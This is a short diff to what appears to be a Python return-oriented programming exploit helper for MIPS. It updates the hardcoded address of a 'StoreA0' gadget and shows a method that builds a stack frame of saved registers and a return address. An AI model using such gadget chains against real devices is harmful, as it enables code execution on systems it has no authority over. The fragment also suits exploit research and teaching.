@@ -15,7 +15,7 @@ class StoreA0(ROP_Gadget):
     jr ra
     '''
     def __init__(self):
-        super().__init__(0x4443a, 0x30)
+        super().__init__(0x44a3e, 0x30)
 
     def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0):
         data = [0, s3, s2, s1, s0, ra]
